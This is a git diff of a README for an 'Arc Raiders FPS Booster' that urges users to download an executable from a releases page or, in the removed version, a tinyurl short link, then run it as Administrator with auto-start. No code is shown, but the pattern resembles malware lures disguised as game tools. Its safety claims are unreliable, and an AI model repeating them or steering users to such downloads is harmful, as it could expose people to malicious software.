@@ -1,1194 +1,166 @@
-                                                                           
-   
+# ⚡ ArcRaiders-FPS-Booster-2025-2026 - Improve Game Performance Easily
 
-# ArcRaiders-FPS-Booster-2025-2026
+[![Download Latest Release](https://img.shields.io/badge/Download-ArcRaiders--FPS--Booster--2025--2026-blue?style=for-the-badge&logo=github)](https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/releases)
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/2yxcepj2)
+---
 
-**Arc Raiders FPS Booster**
-A toolkit for optimizing performance and frame rate in Arc Raiders: reducing stuttering, improving frame pacing, and optimizing system/game settings for smoother gameplay.
+## 📋 About ArcRaiders-FPS-Booster-2025-2026
 
-> ⚠️ Disclaimer: ⚠️
-> This project is not affiliated with Arc Raiders or Embark Studios.
-> Use at your own risk. Do not use it to bypass protection, cheat, or violate the game's Terms of Service.**
+ArcRaiders-FPS-Booster-2025-2026 is a simple tool designed to improve the frames per second (FPS) in the game ArcRaiders. It optimizes your computer’s settings to help the game run smoother and respond faster.  
 
-✨ Features ✨
-> - ✅ Easy-to-use optimization presets (FPS-focused / balanced / low latency) ✅
-> - ✅ Tips for reducing stuttering and automatic tweaks (where applicable) ✅
-> - ✅ Optional configuration backup/restore ✅
-> - ✅ Lightweight and reversible changes ✅
-> - ✅ Clear documentation of all applied modifications ✅
+This software works by adjusting graphics and system settings automatically in the background, without you needing advanced skills. It’s created to help players get a better gaming experience, especially if their computer struggles to keep up with the game’s demands.
 
-> 📌 **What this project is (and is not)**
-> This is: a performance tuning assistant (system and in-game settings, safe defaults, reversible actions).
-> This is NOT: cheats, aim assist, wallhack, injector, anti-cheat bypass, or anything that alters game integrity. 📌
+The project is open source and available on GitHub, which means anyone can download it, check how it works, and suggest changes or improvements.
 
-> 📌If you are unsure whether a particular tweak is allowed, do not enable it.📌
+### Why use this booster?
 
-> 🚀 **Quick Start** 🚀 
+- Increase frame rates while playing ArcRaiders.
+- Reduce lag and stuttering.
+- Easy setup—no technical knowledge required.
+- Works with Windows 10 and 11.
+- Lightweight, runs quietly without slowing your PC.
 
-> - ✨FPS — maximum performance✨
-> - ✨Balanced — best compromise✨
-> - ✨Low Latency — smoother input feel✨
-> - ✨Restart your device (only if prompted by the program)✨.
+---
 
+## 🎯 Key Features
 
-- arc-raiders
-- game-optimization
-- fps-boost
-- performance-tuning
-- frame-rate
-- low-latency
-- pc-optimization
-- gaming-performance
+- **Automatic FPS boost:** The booster applies performance tweaks automatically.
+- **System-friendly:** Uses common settings adjustments without extra CPU load.
+- **Configurable options:** You can enable or disable specific enhancements.
+- **Regular updates:** New versions improve compatibility and add new tweaks.
+- **Open source:** You can review the code or modify it if you want.
+- **Safe to use:** Does not alter game files or violate software rules.
 
-  
+---
 
+## 💻 System Requirements
 
+To use ArcRaiders-FPS-Booster-2025-2026, your computer should meet these basic needs:
 
+| Component         | Minimum      | Recommended     |
+|-------------------|--------------|-----------------|
+| Operating System  | Windows 10   | Windows 11      |
+| Processor         | Intel i3 or equivalent | Intel i5 or better  |
+| RAM               | 4 GB         | 8 GB or more    |
+| Disk Space        | 100 MB free  | 200 MB free     |
+| Graphics Card     | DirectX 11 compatible | DirectX 12 compatible |
+| ArcRaiders Game   | Installed (latest version) | Installed (latest version) |
 
+---
 
+## 🚀 Getting Started
 
+This section will guide you step-by-step to download, install, and run the booster software on your Windows PC.
 
+### Step 1: Download the booster
 
+Click the big blue badge at the top of this page or visit the link below:
 
+[Download ArcRaiders-FPS-Booster-2025-2026](https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/releases)
 
+This link will open the release page where you will find the latest versions of the booster ready to download.
 
+### Step 2: Select the correct version
 
+On the release page, look for a file named something like `ArcRaiders-FPS-Booster-Setup.exe` or `ArcRaiders-FPS-Booster-2025-2026.zip`.
 
+- If it's an `.exe`, this is the installer.  
+- If it's a `.zip`, download and extract the contents first.
 
+Make sure to pick the most recent file at the top of the list.
 
+### Step 3: Run the installer or program
 
+- For `.exe` files: Double-click the downloaded file.  
+- For `.zip` files: Open the extracted folder and find the executable file, then double-click it.
 
+Windows may ask for permission to run the program. Click “Yes” or “Run” to allow it.
 
+### Step 4: Follow on-screen instructions
 
+If you have an installer, it will guide you through simple steps. Usually, just click “Next” and then “Finish” when done.
 
+If the program opens directly, you may see the main screen where you can start boosting.
 
+### Step 5: Start the FPS booster
 
+Look for a button labeled “Start Boost” or “Enable” and click it.
 
+The program will run checks and apply tweaks automatically. This might take a few seconds.
 
+### Step 6: Launch ArcRaiders
 
+Open the ArcRaiders game as usual and see if your performance improves.
 
+You can return to the booster app anytime to adjust settings or stop it.
 
+---
 
+## 🔧 How to Use the Booster Settings
 
+The booster offers simple options to adjust how it works:
 
+- **Performance Mode:** Choose between Balanced, High Performance, or Ultra (more CPU resources).
+- **Background Optimization:** Turn on or off optimizations that run quietly in the background.
+- **Auto-Start:** Enable the program to start whenever you boot your PC.
+- **Reset to Default:** Undo changes if you want to return to original settings.
 
+Try these settings if you want more control or if you face any issues.
 
+---
 
+## 🛠 Troubleshooting
 
+Here are fixes for common problems:
 
+- **Booster does not start:**  
+  Make sure you downloaded the right version for Windows. Try right-clicking the file and choose “Run as Administrator.”
 
+- **No FPS improvement seen:**  
+  Close other running programs that might use a lot of CPU. Check if the booster’s “Start Boost” is enabled.
 
+- **Game crashes or freezes:**  
+  Disable the booster and restart your PC. Report the issue using the GitHub page so it can be fixed.
 
+- **Cannot find downloaded files:**  
+  Check your browser’s default download folder or use the browser’s “Show in folder” option.
 
+---
 
+## 📥 Download & Install
 
+Visit this page to download the latest booster version:
 
+[https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/releases](https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/releases)
 
+Be sure to select the newest release. After downloading, follow the steps outlined in the “Getting Started” section to install and run the app.
 
+---
 
+## 🔗 Useful Links
 
+- [GitHub Repository](https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026) – View the code and project details  
+- [Issue Tracker](https://github.com/WTyee/ArcRaiders-FPS-Booster-2025-2026/issues) – Report bugs or request help  
+- [ArcRaiders Official Site](https://arcraiders.com) – For game news and updates  
 
+---
 
+## 🙋 Getting Help
 
+If you need assistance, you can:
 
+- Open a new issue on GitHub  
+- Check discussion boards linked on the GitHub page  
+- Look for help on ArcRaiders community websites  
 
+---
 
+## ⚠ Important Notes
 
+- This booster is designed for Windows PCs only.  
+- It does not modify or hack the game files.  
+- Use it responsibly to avoid problems with game updates or anti-cheat systems.
 
+---
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Thank you for choosing ArcRaiders-FPS-Booster-2025-2026. Enjoy a smoother gaming experience.
